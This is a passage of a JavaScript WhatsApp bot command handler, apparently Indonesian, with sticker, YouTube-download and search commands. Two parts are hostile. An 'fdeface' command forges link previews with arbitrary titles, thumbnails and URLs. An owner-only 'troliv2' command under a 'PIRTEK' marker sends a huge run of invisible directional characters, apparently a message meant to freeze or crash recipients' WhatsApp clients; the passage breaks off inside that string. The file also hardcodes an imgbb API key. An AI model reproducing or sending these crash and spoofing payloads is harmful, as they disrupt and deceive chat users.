        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
        anu = args.join(" ").split("|");
        satu = anu[0] !== "" ? anu[0] : `SELF`;
        dua = typeof anu[1] !== "undefined" ? anu[1] : `Sticker By Bot-Alya`;
        require("./lib/fetcher.js").createExif(satu, dua);
        require("./lib/fetcher.js").modStick(media, ALIYABOT, mek, from);
        break;
      case "wm":       
      case "stikerwm":
      case "stickerwm":
      case "swm":
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        pe = args.join("");
        var a = pe.split("|")[0];
        var b = pe.split("|")[1];
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              ALIYABOT.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                ALIYABOT.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
          pe = args.join("");
          var a = pe.split("|")[0];
          var b = pe.split("|")[1];
          await createExif(a, b);
          out = getRandom(".webp");
          ffmpeg(media)
            .on("error", (e) => {
              console.log(e);
              ALIYABOT.sendMessage(from, "Terjadi kesalahan", "conversation", {
                quoted: mek,
              });
              fs.unlinkSync(media);
            })
            .on("end", () => {
              _out = getRandom(".webp");
              spawn("webpmux", [
                "-set",
                "exif",
                "./stik/data.exif",
                out,
                "-o",
                _out,
              ]).on("exit", () => {
                ALIYABOT.sendMessage(
                  from,
                  fs.readFileSync(_out),
                  "stickerMessage",
                  { quoted: mek }
                );
                fs.unlinkSync(out);
                fs.unlinkSync(_out);
                fs.unlinkSync(media);
              });
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(out);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`
          );
        }
        break;

      case "fdeface":
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await ALIYABOT.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await ALIYABOT.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        ALIYABOT.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case "public":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        reply(`「 *PUBLIC-MODE* 」`);
        break;
      case "self":
        if (!mek.key.fromMe) return reply("Khusus Owner 🗿");
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        reply(`「 *SELF-MODE* 」`);
        break;
      case "hidetag":
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Perintah Ini hanya bisa di gunakan oleh Admin Grup");
        if (!isGroup) return reply(mess.only.group);
        var value = args.join(" ");
        var group = await ALIYABOT.groupMetadata(from);
        var member = group["participants"];
        var mem = [];
        member.map(async (adm) => {
          mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
        });
        var optionshidetag = {
          text: value,
          contextInfo: { mentionedJid: mem },
          quoted: mek,
        };
        ALIYABOT.sendMessage(from, optionshidetag, text);
        break;              
case 'playmp3':
if (isBanned) return reply(mess.ban)
                  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                  if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
         
                     var srch = args.join('')
                   aramas = await yts(srch);
                   aramat = aramas.all 
                     var mulaikah = aramat[0].url							
                           try {
                             yta(mulaikah)
                             .then((res) => {
                                 const { dl_link, thumb, title, filesizeF, filesize } = res
                                 axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                    
                                 .then(async (a) => {
                                 if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `.•♫•♬• *PLAYING MUSIC* .•♫•♬•\n\n📜𝙏𝙞𝙩𝙡𝙚: ${title}\n🎁𝙏𝙮𝙥𝙚 : mp3\n𝙁𝙞𝙡𝙚 𝙎𝙞𝙯𝙚 : ${filesizeF}\n🖇𝙇𝙞𝙣𝙠 ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                                 const captions = `.•♫•♬• *PLAYING MUSIC* .•♫•♬•\n\n📜𝙏𝙞𝙩𝙡𝙚: ${title}\n🎁𝙏𝙮𝙥𝙚 : mp3\n𝙁𝙞𝙡𝙚 𝙎𝙞𝙯𝙚 : ${filesizeF}\n🖇𝙇𝙞𝙣𝙠 ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                                 sendMediaURL(from, thumb, captions)
                                 await sendMediaURL(from, dl_link).catch(() => reply('error'))
                                 })                
                                 })
                                 } catch (err) {
                                 reply(mess.error.api)
                                 }
                            break
case "playmp4":
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
if (args.length === 0)
return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
reply(mess.wait)
var srch = args.join("")
aramas = await yts(srch)
aramat = aramas.all;
var mulaikah = aramat[0].url;
try {
ytv(mulaikah).then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res;
axios
.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000)
return sendMediaURL(from,thumb,`*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
const captions = `*PLAYING VIDEO*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => reply("error"))
})
})
} catch (err) {
reply(mess.error.api)
}
break  					      
case 'yt':
if (isBanned) return reply(mess.ban)
//if(!isPremium)return reply(mess.only.prem)
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
if (args.length < 1) return reply(`Kirim perintah *${prefix}play query`)
reply('Searching...')
let yut = await yts(q)
yta(yut.videos[0].url)
.then(async(res) => {
const { thumb, title, filesizeF, filesize } = res
const capti = `P L A Y\n\n Title : ${title}\n\n Views: ${yut.videos[0].views}\n\n Duration : ${yut.videos[0].timestamp}\n\n URL : ${yut.videos[0].url}`
ya = await getBuffer(thumb)
py =await ALIYABOT.prepareMessage(from, ya, image)

gbutsan = [
{buttonId: `${prefix}playmp3 ${q}`, buttonText: {displayText: '</AUDIO'}, type: 1},
{buttonId: `${prefix}playmp4 ${q}`, buttonText: {displayText: '</VIDEO'}, type: 1}
]
gbuttonan = {
imageMessage: py.message.imageMessage,
contentText: monospace(capti),
footerText: monospace(`Get Music / Video`),
buttons: gbutsan,
headerType: 4
}
await ALIYABOT.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {quoted:mek})
})
break
      case "sticker":
      case "stiker":
      case "sgif":
      case "s":
      if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              ALIYABOT.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: foncevid,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              ALIYABOT.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: foncevid,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Maximal Video 1-9 Detik`
          );
        }
        break;        
        case 'stcmeme':        
  ct = body.slice(9)
              top = ct.split('|')[0]
              bottom = ct.split('|')[1]
              var imgbb = require('imgbb-uploader')
              if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
              
              ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
              owgi = await ALIYABOT.downloadAndSaveMediaMessage(ger)
              anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
              teks = `${anu.display_url}`
              ranp = getRandom('.gif')
              rano = getRandom('.webp')
              anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
              sendStickerFromUrl(from, `${anu1}`, mess.success)
              } else {
              reply('Gunakan foto/stiker!')
}
               break               
                 case "toimg":
        if (!isQuotedSticker) return reply("𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, `Ni Kak ${pushname}`);
          fs.unlinkSync(ran);
        });
        break;          
        case "yts":
      case "ytsearch":      
        if (args.length < 1) return reply("Tolong masukan query!");
        reply (mess.wait)
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await ALIYABOT.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "「 *YOUTUBE SEARCH* 」";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "❏ Title: " + video.title + "\n";
          ytresult += "❏ Link: " + video.url + "\n";
          ytresult += "❏ Durasi: " + video.timestamp + "\n";
          ytresult +=
            "❏ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "◩ *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;        
      case "setreply":
      
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        grupinv(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await ALIYABOT.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await ALIYABOT.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses");
        } else {
          grupinv(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;      
      case "emoji":
        if (!q) return reply("emojinya?");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;      
case 'ytmp6':
if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks2) return reply('Link Invalid')
try {
reply(monospace(mess.wait))
ytv(args[0])
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 40000) return grupinv(`YOUTUBE MP4

Data Berhasil Didapatkan!
▢ Title : ${title}\
▢ Ext : MP4
▢ Filesize : ${filesizeF}
▢ Link : ${a.data}

Untuk durasi lebih dari batas disajikan dalam bentuk link`)
				const captionsYtmp4 = `YOUTUBE MP4
				
Data Berhasil Didapatkan!
▢ Title : ${title}
▢ Ext : MP4
▢ Size : ${filesizeF}

Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit`
bvidt3 = await getBuffer(thumb)
reply(captionsYtmp4)
bvid3 = await getBuffer(dl_link)
await ALIYABOT.sendMessage(from, bvid3, video, {
contextInfo: {
externalAdReply: {
"title": fake,
"body": `🎧 PLAY VIDEO 🎧`,
"mediaType": "VIDEO",
"mediaType": 2,
"thumbnailUrl": `https://telegra.ph/file/6729a5c1215c1598d3f1d.jpg`,
"mediaUrl": args[0]
}
}, quoted:mek
})
})		
})
} catch (err) {
reply(mess.error.api)
}
break
///𝑃𝐼𝑅𝑇𝐸𝐾
 case "troliv2":
   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
   reply(`🥶ALIYA✓CHAN🥶 MEMEMMEK                                                            MEMEMMEK@                                                                  
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎